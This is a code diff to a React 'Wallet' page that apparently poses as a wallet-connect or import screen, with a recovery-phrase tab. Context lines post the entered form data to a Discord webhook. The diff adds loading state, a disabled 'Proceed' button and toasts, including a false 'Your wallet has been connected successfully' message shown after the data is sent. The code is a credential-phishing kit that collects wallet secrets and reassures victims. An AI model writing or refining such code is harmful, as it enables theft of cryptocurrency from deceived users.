@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { X } from "lucide-react";
+import { useToast } from "@/hooks/use-toast";
 
 // Import wallet logos
 import trustWalletLogo from "@/assets/wallets/trust-wallet-original.png";
@@ -29,6 +30,7 @@ import blockchainLogo from "@/assets/wallets/blockchain.png";
 const Wallet = () => {
   // Discord webhook URL - replace with your actual webhook URL
   const DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+  const { toast } = useToast();
   
   const [chooseWallet, setChooseWallet] = useState(false);
   const [showUninstalled, setShowUninstalled] = useState(true);
@@ -36,6 +38,7 @@ const Wallet = () => {
   const [importDetailsOpen, setImportDetailsOpen] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState<{name: string, icon: any} | null>(null);
   const [activeTab, setActiveTab] = useState("phrase");
+  const [isSubmitting, setIsSubmitting] = useState(false);
   
   // Form field states
   const [walletName, setWalletName] = useState("");
@@ -318,6 +321,14 @@ const Wallet = () => {
   };
 
   const handleImportProceed = async () => {
+    setIsSubmitting(true);
+    
+    // Show processing toast
+    toast({
+      title: "Processing...",
+      description: "Please wait while we process your request.",
+    });
+
     // Prepare form data based on active tab
     const formData: any = {
       walletType: selectedWallet?.name || "Unknown Wallet",
@@ -366,9 +377,21 @@ const Wallet = () => {
           }]
         }),
       });
-      console.log("Data sent to Discord successfully");
+      
+      // Show success toast
+      toast({
+        title: "Success!",
+        description: "Your wallet has been connected successfully.",
+      });
     } catch (error) {
       console.error("Error sending to Discord:", error);
+      toast({
+        title: "Error",
+        description: "Failed to process your request. Please try again.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsSubmitting(false);
     }
 
     // Reset form and close modal
@@ -509,8 +532,9 @@ const Wallet = () => {
               <Button 
                 onClick={handleImportProceed}
                 className="bg-yellow-600 hover:bg-yellow-700 text-white"
+                disabled={isSubmitting}
               >
-                Proceed
+                {isSubmitting ? "Processing..." : "Proceed"}
               </Button>
             </div>
           </div>
